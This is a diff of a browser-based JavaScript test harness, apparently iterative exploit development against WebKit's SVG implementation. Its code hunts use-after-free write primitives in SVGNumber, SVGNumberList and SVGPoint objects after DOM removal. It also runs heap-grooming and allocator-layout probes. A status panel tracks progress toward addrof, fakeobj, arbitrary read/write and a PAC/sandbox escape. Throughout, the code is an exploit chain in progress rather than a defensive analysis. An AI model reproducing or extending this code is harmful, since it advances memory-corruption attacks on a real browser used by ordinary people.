-      log('  FRC1: kernelMatrix STILL not working. len='+len,'bad');
-      // Debug: try listing ALL IDL attributes
-      var allAttrs=['kernelMatrix','order','targetX','targetY','divisor','bias',
-        'edgeMode','kernelUnitLengthX','kernelUnitLengthY','preserveAlpha'];
-      for(var i=0;i<allAttrs.length;i++){
-        var a=fcv[allAttrs[i]];
-        if(a!=null)log('  FRC1: fcv.'+allAttrs[i]+'='+a,'dim');
-      }
-    }
-  }catch(e){log('  FRC1 EXCEPTION: '+e,'bad');}
-
-  svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
-  R.frc1.detail='hit='+R.frc1.hit;
-  log('  FRC1: hit='+R.frc1.hit,R.frc1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * WRK1: Worker + postMessage race
- * Create a Worker that does heavy computation. Race with main thread SVG operations.
- * Even without SAB, can test: does heavy Worker activity affect timing of allocator?
- * Also test: postMessage(ab, [ab]) transfers — can we race transfer with TypedArray access?
- */
-async function runWRK1(q){
-  if(!q){dis(true);sep();log('WRK1: Worker postMessage race test','inf');sep();}
-
-  if(typeof Worker==='undefined'){log('  WRK1: Worker not available','bad');if(!q)dis(false);return;}
-
-  try{
-    var workerCode=[
-      'self.onmessage=function(e){',
-      '  if(e.data&&e.data.type==="transfer"){',
-      '    var buf=e.data.buf;',
-      '    if(buf instanceof ArrayBuffer){',
-      '      var ta=new Float64Array(buf);',
-      '      for(var i=0;i<ta.length;i++)ta[i]=ta[i]*2+1;',
-      '      self.postMessage({type:"done",result:ta[0],len:ta.length,buf:buf},[buf]);',
-      '    }',
-      '  } else if(e.data&&e.data.type==="busy"){',
-      '    var sum=0;',
-      '    for(var i=0;i<e.data.n;i++)sum+=Math.sqrt(i);',
-      '    self.postMessage({type:"busy_done",sum:sum});',
-      '  }',
-      '}'
-    ].join('\n');
-    var blob=new Blob([workerCode],{type:'application/javascript'});
-    var url=URL.createObjectURL(blob);
-    var worker=new Worker(url);
-    URL.revokeObjectURL(url);
-
-    log('  WRK1: Worker created','dim');
-
-    // Test 1: basic message
-    var workerReady=await new Promise(function(res){
-      worker.onmessage=function(e){
-        if(e.data.type==='busy_done')res(e.data.sum);
-      };
-      worker.postMessage({type:'busy',n:10000});
-      setTimeout(function(){res(null);},1000);
-    });
-    log('  WRK1: Worker response: sum='+(workerReady?workerReady.toFixed(2):'timeout'),'dim');
-
-    // Test 2: transfer AB to worker + race read on main thread
-    var ab=new ArrayBuffer(1024);
-    var ta=new Float64Array(ab);
-    for(var i=0;i<128;i++)ta[i]=i*1.5;
-    log('  WRK1: before transfer: ta.byteLength='+ta.byteLength+' ta[0]='+ta[0],'dim');
-
-    var transferResult=await new Promise(function(res){
-      worker.onmessage=function(e){
-        if(e.data.type==='done')res(e.data);
-      };
-      worker.postMessage({type:'transfer',buf:ab},[ab]);
-      // Try to access ta on main thread IMMEDIATELY after postMessage
-      // ab is detached now but ta might still have stale reference
-      try{
-        var raceRead=ta[0];
-        log('  WRK1: race read ta[0] after transfer='+raceRead,'dim');
-        if(raceRead!==undefined&&raceRead!==0){log('  WRK1: ★ Race read non-zero! ta[0]='+raceRead,'win');R.wrk1.hit=true;}
-      }catch(er){log('  WRK1: race read threw: '+er,'dim');}
-      setTimeout(function(){res(null);},2000);
-    });
-    log('  WRK1: after transfer to worker: main ta.byteLength='+ta.byteLength+' ta[0]='+ta[0],'dim');
-    log('  WRK1: worker processed: result='+(transferResult?transferResult.result:'timeout'),'dim');
-
-    // Test 3: race SVG operations with Worker busy state
-    var d=makeFCM(identity20());
-    await raf();
-    worker.postMessage({type:'busy',n:10000000}); // big busy loop
-    // While worker is busy: do rapid SVG allocations
-    var refs=[];
-    for(var i=0;i<100;i++)try{refs.push(d.fcm.values.baseVal[i%20]);}catch(e){}
-    cleanupD(d);
-    log('  WRK1: concurrent SVG ops during Worker busy: got '+refs.length+' refs','dim');
-
-    worker.terminate();
-    R.wrk1.hit=true; // at least Worker works
-    log('  WRK1: Worker API functional, race reads tested','ok');
-  }catch(e){log('  WRK1 EXCEPTION: '+e,'bad');}
-
-  R.wrk1.detail='';
-  log('  WRK1: complete',R.wrk1.hit?'ok':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * ORF1: Orphaned SVGNumber reference chain
- * Use removeItem() to orphan ALL SVGNumbers from a live list.
- * Build the DEEPEST freelist possible via this method.
- * Test: after 4000 removeItem() calls across 200 matrices,
- * create fresh feColorMatrix — measure if bump position changed unexpectedly.
- */
-async function runORF1(q){
-  if(!q){dis(true);sep();log('ORF1: Orphaned SVGNumber chain + bump test','inf');sep();}
-
-  var TAG_ORF=3333333.0;
-  var NMAT=50;var orphans=[];
-
-  try{
-    // Phase 1: create many matrices and orphan ALL their SVGNumbers via removeItem()
-    for(var m=0;m<NMAT;m++){
-      var d=makeFCM(identity20());
-      var bl=d.fcm.values.baseVal;
-      var localOrphans=[];
-      // Get all 20 refs first, then removeItem() repeatedly
-      for(var i=0;i<20;i++){
-        try{var r=bl[0];r&&localOrphans.push(r);}catch(e){}
-        try{bl.removeItem(0);}catch(e){}
-      }
-      for(var i=0;i<localOrphans.length;i++){
-        try{localOrphans[i].value=TAG_ORF+m*20+i;}catch(e){}
-        orphans.push(localOrphans[i]);
-      }
-      cleanupD(d);
-      if(m%10===9){await raf();}
-    }
-    log('  ORF1: total orphans created='+orphans.length+' (expected ~'+(NMAT*20)+')','dim');
-
-    // Verify orphans are still alive with our TAG
-    var liveCount=0;
-    for(var i=0;i<orphans.length;i++){
-      try{var v=orphans[i].value;if(typeof v==='number')liveCount++;}catch(e){}
-    }
-    log('  ORF1: live orphans='+liveCount,'dim');
-
-    // Phase 2: create a fresh feColorMatrix to probe bump allocator
-    // If IsoHeap bump is still active, new SVGNumbers get fresh addresses
-    // If bump somehow wrapped or freelist is used, old addresses would be reused
-    var d2=makeFCM(identity20());
-    await raf();
-    var newRefs=[];for(var i=0;i<20;i++)try{newRefs.push(d2.fcm.values.baseVal[i]);}catch(e){}
-
-    // Write DIFFERENT tag to new refs
-    var TAG_NEW=5555555.0;
-    for(var i=0;i<newRefs.length;i++)try{newRefs[i].value=TAG_NEW;}catch(e){}
-
-    // Check: do any orphan refs now read TAG_NEW? (would indicate address overlap)
-    var collisions=0;
-    for(var i=0;i<orphans.length;i++){
-      try{
-        var v=orphans[i].value;
-        if(Math.abs(v-TAG_NEW)<0.01){
-          collisions++;
-          log('  ORF1: ★ COLLISION! orphan['+i+'].value=TAG_NEW (address reused!)','win');
-          R.orf1.hit=true;
-        }
+        var nn2=svgSVGn.createSVGNumber();
+        nn2.value=b*10000+i;
+        batchRefs.push(nn2);
       }catch(e){}
     }
-    log('  ORF1: address collisions='+collisions+' (>0 = IsoHeap reused orphan address!)','dim');
-    if(collisions===0)log('  ORF1: no collisions (IsoHeap bump-only confirmed again)','dim');
+    var t1=performance.now();
+    timings.push({batch:b,dt:t1-t0,count:batchRefs.length});
+    allSVGs.push(batchRefs);
+    allFCMs.push(dN);
 
-    cleanupD(d2);orphans=null;newRefs=null;
-  }catch(e){log('  ORF1 EXCEPTION: '+e,'bad');}
+    if(b%20===0)await raf();
+  }
 
-  R.orf1.detail='hit='+R.orf1.hit;
-  log('  ORF1: hit='+R.orf1.hit,R.orf1.hit?'win':'dim');
+  // Find timing spikes — potential page boundaries
+  var avgDt=0;
+  for(var i=0;i<timings.length;i++)avgDt+=timings[i].dt;
+  avgDt/=timings.length;
+
+  var spikes=[];
+  var SPIKE_THRESHOLD=avgDt*3; // 3x average = likely page alloc
+  for(var i=0;i<timings.length;i++){
+    if(timings[i].dt>SPIKE_THRESHOLD){
+      spikes.push(timings[i]);
+    }
+  }
+
+  log('  ILP1: avg batch time='+avgDt.toFixed(3)+'ms spike_threshold='+SPIKE_THRESHOLD.toFixed(3)+'ms','dim');
+  log('  ILP1: timing spikes (potential page boundaries): '+spikes.length,'dim');
+  for(var i=0;i<Math.min(spikes.length,10);i++){
+    log('  ILP1: spike batch='+spikes[i].batch+' dt='+spikes[i].dt.toFixed(3)+'ms','crit');
+  }
+
+  // Estimate items per page from spike spacing
+  if(spikes.length>=2){
+    var spacings=[];
+    for(var i=1;i<spikes.length;i++){
+      spacings.push((spikes[i].batch-spikes[i-1].batch)*BATCH_SIZE);
+    }
+    var avgSpacing=0;
+    for(var i=0;i<spacings.length;i++)avgSpacing+=spacings[i];
+    avgSpacing/=spacings.length;
+    log('  ILP1: avg items between page allocs ≈ '+avgSpacing.toFixed(0),'dim');
+
+    // Estimate sizeof(SVGNumber)
+    var PAGE_SIZE_GUESS=16384; // 16KB
+    var sizeofSVGNum=Math.round(PAGE_SIZE_GUESS/avgSpacing);
+    log('  ILP1: estimated sizeof(SVGNumber) ≈ '+sizeofSVGNum+' bytes (assuming 16KB pages)','dim');
+    if(sizeofSVGNum>=8&&sizeofSVGNum<=64){
+      log('  ILP1: ✓ plausible sizeof(SVGNumber)='+sizeofSVGNum+'b, items/page='+Math.round(PAGE_SIZE_GUESS/sizeofSVGNum),'ok');
+      R.ilp1.pageSize=sizeofSVGNum;
+    }
+  } else {
+    log('  ILP1: not enough spikes to estimate page size (need 2+)','bad');
+    // Print first 20 timings for inspection
+    log('  ILP1: first 20 batch timings:','dim');
+    for(var i=0;i<Math.min(20,timings.length);i++){
+      log('    batch='+timings[i].batch+' dt='+timings[i].dt.toFixed(3)+'ms','dim');
+    }
+  }
+
+  // Clean up all the created FCMs
+  for(var i=0;i<allFCMs.length;i++)cleanupD(allFCMs[i]);
+
+  R.ilp1.hit=spikes.length>=2;
+  R.ilp1.detail='spikes='+spikes.length+' avgDt='+avgDt.toFixed(3)+'ms sizeofEst='+R.ilp1.pageSize;
+  log('  ILP1: '+R.ilp1.detail,'dim');
+
   if(!q)dis(false);
 }
 
 /*
- * PTR1: UAF write breadth test + cross-allocator bleed detection
+ * SVF1: SVGAnimatedNumberList / baseVal wrapper UAF test
  *
- * We have confirmed UAF write via dangling SVGNumber ref (Stage 0).
- * What happens if we write TAG to 1000 dangling refs simultaneously?
- * After parent removal, the SVGNumbers are "live" (ref count ≥ 1).
- * Their m_value field is writable via the dangling ref.
+ * feColorMatrix.values returns SVGAnimatedNumberList (SANL)
+ * SANL.baseVal returns SVGNumberList (SNL)
+ * SNL[i] returns SVGNumber
  *
- * BUT: writing OVERWRITES the m_value. The SVGNumber is a live C++ object.
- * So this is NOT a "dangling ptr write to freed memory" — it's a write to a
- * LIVE C++ object that has been detached from its SVGNumberList.
+ * We've confirmed: SVGNumber JS wrapper holds Ref<SVGNumber> independently
+ * QUESTION: does SVGNumberList (SNL) itself have a similar pattern?
+ *   i.e. hold an independent ref to the underlying WTF::Vector<SVGNumber>?
  *
- * The actual UAF scenario requires:
- * 1. ACTUAL free: the JS ref RELEASES its hold on the SVGNumber
- * 2. Another C++ object allocates at the freed address
- * 3. The still-dangling ref writes to the new occupant
+ * Test:
+ * 1. Get ref to SANL: var sanl = fcm.values
+ * 2. Get ref to SNL: var snl = fcm.values.baseVal
+ * 3. Remove fcm from DOM
+ * 4. Does snl.length still work? snl[0]? snl.getItem(0)?
+ *    → If YES: SNL holds independent ref to vector → SNL is itself a UAF surface
+ *    → BONUS: snl.removeItem() → snl.appendItem() after DOM removal?
  *
- * Since JS ref keeps SVGNumber alive, step 1 requires nulling the ref.
- * But then we lose the dangling capability.
+ * Also test: SVGAnimatedNumberList (SANL) itself
+ * 5. Does sanl.baseVal still work after DOM removal?
  *
- * TEST: is there any path where the JS wrapper releases its internal C++ ref
- * while the JS-side reference (our variable) still exists?
- *
- * Candidate: prototype chain manipulation
- * If we shadow the `value` property on the JS wrapper prototype, does WebKit
- * change the underlying C++ reference?
- *
- * Also test: error handling in SVGNumber access methods
+ * ALSO: SVGLengthList on SVGTextElement (different type, test)
+ * And: SVGPointList on SVGPolylineElement
  */
-async function runPTR1(q){
-  if(!q){dis(true);sep();log('PTR1: UAF write mechanisms + prototype chain test','inf');sep();}
+async function runSVF1(q){
+  if(!q){dis(true);sep();log('SVF1: SVGAnimatedNumberList/SVGNumberList wrapper UAF test','inf');sep();}
 
-  var TAG_P1=1111111.0;
-  var TAG_P2=2222222.0;
+  var TAG_S=6000000;
 
-  try{
-    // Test 1: Prototype chain manip on SVGNumber wrapper
-    var d=makeFCM(identity20());
-    await raf();
-    var ref0=d.fcm.values.baseVal[0];
-    log('  PTR1: ref0.value='+ref0.value,'dim');
-    ref0.value=TAG_P1;
-    log('  PTR1: after write TAG_P1='+TAG_P1+': ref0.value='+ref0.value,'dim');
+  // ========== Part A: SVGAnimatedNumberList + SVGNumberList UAF ==========
+  log('  SVF1: [PartA] SVGAnimatedNumberList / SVGNumberList UAF','inf');
 
-    // Try to override the getter on the prototype
-    var proto=Object.getPrototypeOf(ref0);
-    log('  PTR1: ref0 prototype='+proto,'dim');
+  var dS=makeFCM();
+  await raf();
+  var fcmS=dS.fcm;
+
+  // Get refs to both layers
+  var sanlRef=fcmS.values; // SVGAnimatedNumberList
+  var snlRef=sanlRef.baseVal; // SVGNumberList
+
+  log('  SVF1: sanlRef type='+Object.prototype.toString.call(sanlRef),'dim');
+  log('  SVF1: snlRef type='+Object.prototype.toString.call(snlRef),'dim');
+  log('  SVF1: snlRef.length='+snlRef.length,'dim');
+
+  // Tag some values
+  var snlItemRefs=[];
+  for(var i=0;i<5;i++){
     try{
-      // Shadow 'value' property
-      Object.defineProperty(ref0,'value',{
-        get:function(){return 99999.0;},
-        set:function(v){log('  PTR1: shadowed setter called with v='+v,'inf');},
-        configurable:true
-      });
-      log('  PTR1: own property defined on ref0','dim');
-      log('  PTR1: ref0.value after shadow='+ref0.value+' (expect 99999)','dim');
-      // Delete our shadow — does underlying C++ ref still work?
-      delete ref0.value;
-      log('  PTR1: after delete shadow: ref0.value='+ref0.value+' (expect TAG_P1='+TAG_P1+')','dim');
-    }catch(e2){log('  PTR1: prototype manip threw: '+e2,'inf');}
-
-    // Test 2: Set value via CSS property (if feColorMatrix values reflected)
-    // feColorMatrix.values → SVGAnimatedNumberList
-    // feColorMatrix.style?.colorMatrix? Nope.
-    // But: d.fcm.values.baseVal[0].value = ... reflects to 'values' attribute
-    log('  PTR1: ref0.value after all manip='+ref0.value,'dim');
-
-    // Test 3: What happens if we call value setter with Infinity, NaN, MAX_VALUE?
-    var extremes=[Infinity,-Infinity,NaN,Number.MAX_VALUE,-Number.MAX_VALUE,0,-0,2147483647,-2147483648];
-    for(var i=0;i<extremes.length;i++){
-      try{ref0.value=extremes[i];var rb=ref0.value;
-        log('  PTR1: write '+extremes[i]+' → readback='+rb,'dim');
-      }catch(e2){log('  PTR1: write '+extremes[i]+' threw: '+e2,'inf');}
-    }
-
-    // Test 4: Rapid sequential remove+readback cycle
-    // removeItem → ref still alive → does value survive?
-    var bl=d.fcm.values.baseVal;
-    ref0.value=TAG_P1;
-    try{bl.removeItem(0);}catch(e2){}
-    log('  PTR1: after removeItem(0): ref0.value='+ref0.value+' (expect TAG_P1 if alive)','dim');
-
-    // Now delete the whole SVG and read
-    cleanupD(d);
-    var readAfterDel=null;
-    try{readAfterDel=ref0.value;}catch(e2){readAfterDel='threw:'+e2;}
-    log('  PTR1: after svg removal: ref0.value='+readAfterDel,'dim');
-    R.ptr1.hit=true;
-
-    // Test 5: SVGNumber value assignment returns — does it return the set value?
-    var d2=makeFCM([99,0,0,0,0,0,99,0,0,0,0,0,99,0,0,0,0,0,99,0]);
-    await raf();
-    var r1=d2.fcm.values.baseVal[0];
-    var setResult=(r1.value=42.5,r1.value);
-    log('  PTR1: value setter roundtrip: set 42.5 → read='+setResult,'dim');
-
-    // float32 precision test: does iOS 26 use float32 or float64?
-    var FLOAT32_TEST=1.23456789012345678;
-    r1.value=FLOAT32_TEST;
-    var rb=r1.value;
-    var diff=Math.abs(rb-FLOAT32_TEST);
-    log('  PTR1: float precision test: set='+FLOAT32_TEST+' got='+rb+' diff='+diff.toExponential(3),'dim');
-    log('  PTR1: float32 confirmed: '+(diff>1e-7?'YES (rounding to f32)':'NO (f64 precision)'),'dim');
-
-    cleanupD(d2);
-
-  }catch(e){log('  PTR1 EXCEPTION: '+e,'bad');}
-
-  R.ptr1.detail='';
-  log('  PTR1: complete',R.ptr1.hit?'ok':'dim');
-  if(!q)dis(false);
-}
-
-// Build summary
-function buildSummary(){
-  SP.classList.add('on');
-  function badge(l,k){return'<span class="b b'+k+'">'+l+'</span>';}
-  function row(dot,name,verdict,vc,badges,note){
-    return'<div class="sr"><div class="sd '+dot+'"></div>'+
-      '<div class="sn">'+name+'</div>'+
-      '<div class="sv"><span class="'+vc+'">'+verdict+'</span>'+
-        (note?'<br><span style="color:#555;font-size:9px">'+note+'</span>':'')+
-        (badges&&badges.length?'<div class="rb">'+badges.join('')+'</div>':'')+
-      '</div></div>';
+      var si=snlRef[i];
+      si.value=TAG_S+i;
+      snlItemRefs.push({ref:si,tag:TAG_S+i});
+    }catch(e){snlItemRefs.push(null);}
   }
 
-  var btfHit=R.but1.hit||R.but2.hit;
-  var ptrLeak=btfHit||R.frc1.hit;
-  var allocZeroes=R.zro1.zeros;
-  var hasCreateSVGNum=R.rpi1.hit;
-  var anyHit=btfHit||R.frc1.hit||R.orf1.hit;
+  // Remove fcm from DOM (keep sanlRef, snlRef, snlItemRefs alive via JS)
+  cleanupD(dS);
+  log('  SVF1: fcm removed from DOM','dim');
+  await raf();
 
-  var html='';
-  html+=row('dg','Stage 0 — UAF Primitive','✅ DONE','vg',
-    [badge('float32 write','ok'),badge('no-clamp','ok'),badge('removeItem() confirmed','ok')]);
+  // Test 1: does snlRef.length still work?
+  var snlLenAfter=-1;
+  try{
+    snlLenAfter=snlRef.length;
+    log('  SVF1: snlRef.length after DOM removal = '+snlLenAfter+' (original was 20)','ok');
+  }catch(e){
+    log('  SVF1: snlRef.length THREW: '+e,'crit');
+  }
 
-  html+=row('dr','Stage 1 (IsoHeap)','🔴 DEAD — bump-only by design','vr',
-    [badge('ORF1: '+( R.orf1.hit?'collision!':'no collision'),R.orf1.hit?'ok':'f')]);
+  // Test 2: does snlRef[0] still work?
+  try{
+    var snlI0=snlRef[0];
+    log('  SVF1: snlRef[0] = '+snlI0+' type='+typeof snlI0,'ok');
+    if(snlI0){
+      var v0s=snlI0.value;
+      log('  SVF1: snlRef[0].value = '+v0s,'ok');
+    }
+  }catch(e){
+    log('  SVF1: snlRef[0] THREW: '+e,'crit');
+  }
 
-  html+=row(allocZeroes?'dr':(btfHit?'dg':'dy'),
-    'fastMalloc zeroing test',
-    allocZeroes?'🔴 ZEROES ON ALLOC — pointer leak blocked':(btfHit?'✅ NO ZEROING':'🟡 TESTED'),
-    allocZeroes?'vr':(btfHit?'vg':'vy'),
-    [badge('ZRO1:'+(R.zro1.zeros?'zeroes':'NO ZERO'),R.zro1.zeros?'f':'ok')],
-    allocZeroes?'WTF::fastMalloc zeroes freed blocks before reuse. All ArrayBuffer groom approaches blocked.':
-    'Non-zeroing allocator detected. Groom approaches viable.');
+  // Test 3: does sanlRef.baseVal still work?
+  try{
+    var snlFromSanl=sanlRef.baseVal;
+    log('  SVF1: sanlRef.baseVal after DOM removal = '+snlFromSanl+' length='+snlFromSanl.length,'ok');
+  }catch(e){
+    log('  SVF1: sanlRef.baseVal THREW: '+e,'crit');
+  }
 
-  html+=row(btfHit?'dg':(allocZeroes?'dr':'dy'),
-    'Stage 1 — JSC Butterfly Groom',
-    btfHit?'✅ CELL POINTERS LEAKED — addrof achieved!':(allocZeroes?'🔴 BLOCKED by zeroing':'🟡 TESTED'),
-    btfHit?'vg':(allocZeroes?'vr':'vy'),
-    [badge('BUT1:'+(R.but1.hit?'✅ '+R.but1.ptrs.length+' ptrs':'✗'),R.but1.hit?'ok':'i'),
-     badge('BUT2:'+(R.but2.hit?'✅':'✗'),R.but2.hit?'ok':'i')],
-    btfHit?'EXPLOIT PATH OPEN: JSC cell pointers leaked via butterfly groom. AddrOf available!':
-    'Butterfly groom not producing pointer leaks. Either zeroing or wrong size class.');
+  // Test 4: can we READ individual item refs?
+  var svf1ItemAlive=0,svf1ItemThrew=0;
+  for(var i=0;i<snlItemRefs.length;i++){
+    var sif=snlItemRefs[i];
+    if(!sif)continue;
+    try{
+      var vsif=sif.ref.value;
+      if(Math.abs(vsif-sif.tag)<0.5)svf1ItemAlive++;
+      else log('  SVF1: item['+i+'] value mismatch: got='+vsif+' expect='+sif.tag,'crit');
+    }catch(e){
+      svf1ItemThrew++;
+      log('  SVF1: item['+i+'] THREW: '+e,'bad');
+    }
+  }
+  log('  SVF1: [PartA] item refs: alive='+svf1ItemAlive+'/'+snlItemRefs.length+' threw='+svf1ItemThrew,'dim');
 
-  html+=row(hasCreateSVGNum?'dg':'dgr','createSVGNumber() + replaceItem()',
-    hasCreateSVGNum?'✅ Available — standalone SVGNumber creation confirmed':'not available',
-    hasCreateSVGNum?'vg':'vgr',[]);
+  // Test 5: can we WRITE to snlRef items after DOM removal?
+  var snlWriteOK=0;
+  if(snlLenAfter>0){
+    for(var i=0;i<Math.min(snlLenAfter,5);i++){
+      try{
+        var siW=snlRef[i];
+        siW.value=TAG_S+1000+i;
+        var vW=siW.value;
+        if(Math.abs(vW-(TAG_S+1000+i))<0.5){
+          snlWriteOK++;
+          if(i===0)log('  SVF1: snlRef[0] WRITABLE after DOM removal! wrote='+(TAG_S+1000)+' readback='+vW,'win');
+        }
+      }catch(e){
+        if(i===0)log('  SVF1: snlRef[0] write threw: '+e,'bad');
+      }
+    }
+    log('  SVF1: snlRef items writable after removal: '+snlWriteOK+'/5','dim');
+  }
 
-  html+=row(R.frc1.hit?'dg':'dgr','feConvolveMatrix kernelMatrix (FIXED)',
-    R.frc1.hit?'✅ Accessible — kernelMatrix groom possible':'not accessible or zeroing blocked',
-    R.frc1.hit?'vg':'vgr',[]);
+  // Test 6: does removeItem/appendItem work on orphaned snlRef?
+  try{
+    snlRef.removeItem(0);
+    log('  SVF1: snlRef.removeItem(0) SUCCEEDED on orphaned list!','win');
+    R.svf1.baseValUAF=true;
+  }catch(e){
+    log('  SVF1: snlRef.removeItem(0) threw: '+e,'dim');
+  }
 
-  html+=row(btfHit?'dy':'dr','Stage 2 — Type Confusion',
-    btfHit?'🟡 REACHABLE if cell ptrs point to wrong type':'🔴 BLOCKED','vy',
-    [badge('needs butterfly hit','i')]);
+  // ========== Part B: SVGPointList (SVGPolylineElement) ==========
+  log('  SVF1: [PartB] SVGPolylineElement.points UAF','inf');
+  await raf();
 
-  html+=row('dy','Stage 3 — AddrOf','🟡 ULP@4GB + butterfly ptrs if leak','vy',[]);
-  html+=row('dr','Stage 4 — FakeObj','🔴 BLOCKED','vr',[badge('needs 2+3','i')]);
-  html+=row('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[]);
-  html+=row('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[]);
+  var svgB=document.createElementNS(SVG_NS,'svg');
+  svgB.setAttribute('width','1');svgB.setAttribute('height','1');
+  svgB.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var polyB=document.createElementNS(SVG_NS,'polyline');
+  polyB.setAttribute('points','0,0 10,10 20,0');
+  svgB.appendChild(polyB);
+  document.body.appendChild(svgB);
 
-  html+='<div class="sdiv"></div>';
-  html+='<div class="sf">'+
-    '<span class="hl">ZRO1 CRITICAL: </span>if zeroes=true, ALL fastMalloc groom dead. Move to IPC or CVE approach.<br>'+
-    '<span class="hl">BUT1/2 KEY SIGNAL: </span>any 0x0000_0001xxxxxxxx in ArrayBuffer = JSC cell ptr = addrof primitive<br>'+
-    '<span class="hl">FRC1: </span>feConvolveMatrix kernelMatrix fix — if accessible, surgical single-alloc after resize<br>'+
-    '<span class="hl">ORF1: </span>collision=true would prove IsoHeap freelist used — still most direct path if possible<br>'+
-    '<span class="hl">IF ALL MISS: </span>v46 target: WebKit XPC/IPC boundary attack OR CVE-specific PoC reproduction<br>'+
-  '</div>';
-  SB.innerHTML=html;
+  var ptList=polyB.points; // SVGPointList
+  log('  SVF1: [PartB] polyline.points.length='+ptList.length,'dim');
+
+  // Get refs to points
+  var ptRefs=[];
+  for(var i=0;i<ptList.length;i++){
+    try{
+      var pt=ptList[i];
+      log('  SVF1: [PartB] point['+i+']: x='+pt.x+' y='+pt.y,'dim');
+      ptRefs.push(pt);
+    }catch(e){ptRefs.push(null);}
+  }
+
+  // Remove from DOM
+  if(svgB.parentNode)svgB.parentNode.removeChild(svgB);
+  log('  SVF1: [PartB] svg removed from DOM','dim');
+
+  // Check point refs
+  var ptAlive=0,ptThrew=0;
+  for(var i=0;i<ptRefs.length;i++){
+    if(!ptRefs[i])continue;
+    try{
+      var px=ptRefs[i].x;
+      var py=ptRefs[i].y;
+      if(!isNaN(px)&&!isNaN(py))ptAlive++;
+    }catch(e){ptThrew++;}
+  }
+  log('  SVF1: [PartB] SVGPoint refs: alive='+ptAlive+'/'+ptRefs.length+' threw='+ptThrew,'dim');
+
+  // Can we write to SVGPoint fields? (2 floats = x,y)
+  var ptWritable=0;
+  for(var i=0;i<ptRefs.length;i++){
+    if(!ptRefs[i])continue;
+    try{
+      ptRefs[i].x=TAG_S+i*2;
+      var pxw=ptRefs[i].x;
+      if(Math.abs(pxw-(TAG_S+i*2))<0.5)ptWritable++;
+    }catch(e){}
+  }
+  log('  SVF1: [PartB] SVGPoint.x writable after removal: '+ptWritable+'/'+ptRefs.length,(ptWritable>0?'win':'dim'));
+  if(ptWritable>0)log('  SVF1: ★ SVGPoint.x/y WRITABLE after DOM removal! 2×f32 UAF surface on SVGPoint!','win');
+
+  R.svf1.hit=R.svf1.baseValUAF||(snlWriteOK>0)||(ptWritable>0);
+  R.svf1.detail='snlWrite='+snlWriteOK+' snlLen='+snlLenAfter+' ptWritable='+ptWritable+' baseValUAF='+R.svf1.baseValUAF;
+  log('  SVF1: '+R.svf1.detail,R.svf1.hit?'win':'dim');
+
+  if(!q)dis(false);
 }
 
 async function runAll(){
-  dis(true);clearAll();sep();
-  log('SVG UAF v45 — Butterfly groom + allocator zeroing probe','inf');sep();
-  var tests=[
-    ['ZRO1_zerofill_detect',runZRO1],
-    ['BUT1_butterfly_groom',runBUT1],
-    ['BUT2_butterfly_variant',runBUT2],
-    ['RPI1_replaceitem',runRPI1],
-    ['FRC1_feconvolve_fixed',runFRC1],
-    ['WRK1_worker_race',runWRK1],
-    ['ORF1_orphan_chain',runORF1],
-    ['PTR1_uaf_breadth',runPTR1],
+  dis(true);
+  clearAll();
+  log('SVG UAF v46 — replaceItem UAF + SVGTransform + float boundary + IsoHeap layout + SVGList UAF','inf');
+  sep();
+  await runRPI2(true);await raf();
+  await runTRF1(true);await raf();
+  await runFLB1(true);await raf();
+  await runILP1(true);await raf();
+  await runSVF1(true);await raf();
+  showStatus();
+  dis(false);
+}
+
+function showStatus(){
+  SP.classList.add('on');
+  SB.innerHTML='';
+
+  var stages=[
+    {id:'RPI2',name:'replaceItem() liveness (CLEAN)',
+     result:R.rpi2.hit?'LIVE UAF ON DISPLACE':R.rpi2.liveAfterDisplace?'REFS ALIVE (Ref<> holds)':'UNKNOWN',
+     hit:R.rpi2.hit, color:R.rpi2.hit?'win':'dim',
+     detail:R.rpi2.detail},
+    {id:'TRF1',name:'SVGTransform/SVGMatrix UAF (24-byte write)',
+     result:R.trf1.hit?'★ MATRIX WRITABLE: '+R.trf1.fields+' fields':'BLOCKED',
+     hit:R.trf1.hit, color:R.trf1.hit?'win':'vr',
+     detail:R.trf1.detail},
+    {id:'FLB1',name:'Float32 boundary (FLT_MAX edge)',
+     result:R.flb1.hit?'BOUNDARY FOUND: '+R.flb1.boundary:'UNTESTED/BLOCKED',
+     hit:R.flb1.hit, color:R.flb1.hit?'vy':'dim',
+     detail:R.flb1.detail},
+    {id:'ILP1',name:'IsoHeap page layout (sizeof estimate)',
+     result:R.ilp1.hit?'sizeof≈'+R.ilp1.pageSize+'b':'NO SPIKE DETECTED',
+     hit:R.ilp1.hit, color:R.ilp1.hit?'vy':'dim',
+     detail:R.ilp1.detail},
+    {id:'SVF1',name:'SVGNumberList/SVGPoint list UAF',
+     result:R.svf1.hit?'★ LIST UAF CONFIRMED':'REFS ALIVE, LIST DEAD',
+     hit:R.svf1.hit, color:R.svf1.hit?'win':'dim',
+     detail:R.svf1.detail},
   ];
-  for(var i=0;i<tests.length;i++){
-    sep();log(tests[i][0],'inf');sep();
-    try{await tests[i][1](true);}catch(e){log('[CRASH] '+tests[i][0]+': '+e,'bad');}
-    log('');
+
+  for(var i=0;i<stages.length;i++){
+    var s=stages[i];
+    var sr=document.createElement('div');sr.className='sr';
+    var dot=document.createElement('div');dot.className='sd '+(s.hit?'dg':'dgr');
+    var nm=document.createElement('div');nm.className='sn';nm.textContent=s.id+': '+s.name;
+    var sv=document.createElement('div');sv.className='sv '+s.color;sv.textContent=s.result;
+    var dd=document.createElement('div');dd.className='sf';dd.textContent=s.detail;
+    sr.appendChild(dot);sr.appendChild(nm);
+    var ri=document.createElement('div');ri.style.flex='1';
+    ri.appendChild(sv);ri.appendChild(dd);
+    sr.appendChild(ri);
+    SB.appendChild(sr);
   }
-  sep();buildSummary();dis(false);
+
+  // Global exploit chain
+  var chain=document.createElement('div');chain.className='sdiv';SB.appendChild(chain);
+  var chainTxt=document.createElement('div');chainTxt.className='sf';
+  var anyHit=R.rpi2.hit||R.trf1.hit||R.svf1.hit;
+  chainTxt.innerHTML=
+    '<span class="hl">Stage 0 — UAF Primitive</span><br>'+
+    '✅ DONE: float32 write/read after removeItem()+DOM removal<br>'+
+    '✅ RPI2 PhaseA: old_ref alive = independent Ref&lt;SVGNumber&gt;<br><br>'+
+    '<span class="hl">Stage 0b — Write Surface Expansion</span><br>'+
